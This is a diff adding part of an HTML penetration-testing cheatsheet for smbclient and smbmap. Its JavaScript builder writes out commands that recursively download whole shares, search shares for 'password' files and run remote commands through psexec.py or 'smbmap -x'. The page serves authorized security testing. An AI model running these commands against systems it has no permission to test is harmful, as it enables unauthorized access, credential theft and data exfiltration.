+          <option value="exec">Execute Command</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>EXTRA (file / pattern / cmd)</label>
+        <input type="text" id="b-extra" value="" placeholder="filename / pattern / command">
+      </div>
+    </div>
+    <div class="gen-label">GENERATED COMMAND</div>
+    <div class="gen-output" id="gen-output">Select options above to generate a command...</div>
+  </div>
+</div><!-- /panel2 -->
+
+</div><!-- /content -->
+
+<footer>// smbclient &amp; smbmap cheatsheet &nbsp;|&nbsp; penetration testing reference &nbsp;|&nbsp; for authorized use only</footer>
+
+<script>
+(function () {
+  'use strict';
+
+  var tabBtns = document.querySelectorAll('.tab');
+  var panels  = [
+    document.getElementById('panel0'),
+    document.getElementById('panel1'),
+    document.getElementById('panel2')
+  ];
+
+  // Tab switching
+  tabBtns.forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      var idx = parseInt(btn.getAttribute('data-tab'), 10);
+      tabBtns.forEach(function (b, i) { b.classList.toggle('active', i === idx); });
+      panels.forEach(function (p, i)  { p.classList.toggle('active', i === idx); });
+    });
+  });
+
+  // Copy on click
+  document.querySelectorAll('.cmd').forEach(function (el) {
+    el.addEventListener('click', function () {
+      var btn  = el.querySelector('.copy-btn');
+      var text = el.innerText.replace(/\s*(copy|done!)\s*$/, '').trim();
+      if (!navigator.clipboard) { return; }
+      navigator.clipboard.writeText(text).then(function () {
+        btn.textContent = 'done!';
+        btn.classList.add('copied');
+        setTimeout(function () {
+          btn.textContent = 'copy';
+          btn.classList.remove('copied');
+        }, 1500);
+      });
+    });
+  });
+
+  // Builder
+  ['b-tool','b-target','b-share','b-user','b-pass','b-domain','b-action','b-extra'].forEach(function (id) {
+    var el = document.getElementById(id);
+    if (el) {
+      el.addEventListener('input',  buildCmd);
+      el.addEventListener('change', buildCmd);
+    }
+  });
+
+  function buildCmd() {
+    var tool   = document.getElementById('b-tool').value;
+    var target = document.getElementById('b-target').value || 'TARGET';
+    var share  = document.getElementById('b-share').value  || 'ShareName';
+    var user   = document.getElementById('b-user').value;
+    var pass   = document.getElementById('b-pass').value;
+    var domain = document.getElementById('b-domain').value;
+    var action = document.getElementById('b-action').value;
+    var extra  = document.getElementById('b-extra').value;
+    var cmd    = '';
+
+    if (tool === 'smbclient') {
+      var auth = (user && pass)
+        ? ("-U '" + (domain ? domain + '\\' : '') + user + '%' + pass + "'")
+        : (user ? '-U ' + user : '-N');
+
+      if      (action === 'list_shares') cmd = 'smbclient -L //' + target + ' ' + auth;
+      else if (action === 'connect')     cmd = 'smbclient //' + target + '/' + share + ' ' + auth;
+      else if (action === 'ls')          cmd = 'smbclient //' + target + '/' + share + ' ' + auth + ' -c "ls"';
+      else if (action === 'download')    cmd = 'smbclient //' + target + '/' + share + ' ' + auth + ' -c "get ' + (extra || 'filename.txt') + '"';
+      else if (action === 'upload')      cmd = 'smbclient //' + target + '/' + share + ' ' + auth + ' -c "put ' + (extra || '/tmp/file.txt') + '"';
+      else if (action === 'recursive')   cmd = 'smbclient //' + target + '/' + share + ' ' + auth + ' -c "recurse; prompt OFF; mget *"';
+      else if (action === 'search')      cmd = 'smbclient //' + target + '/' + share + ' ' + auth + ' -c "ls ' + (extra || '*') + '"';
+      else if (action === 'exec')        cmd = '# smbclient has no direct exec - use impacket:\npsexec.py ' + (domain ? domain + '/' : '') + user + ':' + pass + '@' + target + ' cmd.exe /c "' + (extra || 'whoami') + '"';
+
+    } else {
+      var u    = user   ? '-u ' + user          : '-u guest';
+      var p    = pass   ? "-p '" + pass + "'"   : '';
+      var d    = domain ? '-d ' + domain        : '';
+      var base = ('smbmap -H ' + target + ' ' + d + ' ' + u + ' ' + p).replace(/\s+/g, ' ').trim();
+
+      if      (action === 'list_shares')                 cmd = base;
+      else if (action === 'connect' || action === 'ls')  cmd = base + " -r '" + share + "'";
+      else if (action === 'recursive')                   cmd = base + ' -R ' + share;
+      else if (action === 'download')                    cmd = base + " --download '" + share + '\\' + (extra || 'file.txt') + "'";
+      else if (action === 'upload') {
+        var fname = extra ? extra.split('/').pop() : 'file.txt';
+        cmd = base + " --upload '" + (extra || '/tmp/file.txt') + "' '" + share + '\\' + fname + "'";
+      }
+      else if (action === 'search') cmd = base + ' -R ' + share + " -A '" + (extra || 'password') + "'";
+      else if (action === 'exec')   cmd = base + " -x '" + (extra || 'whoami') + "'";
+    }
+
+    document.getElementById('gen-output').textContent = cmd;
+  }
+
+  buildCmd();
+}());
+</script>
+</body>
+</html>
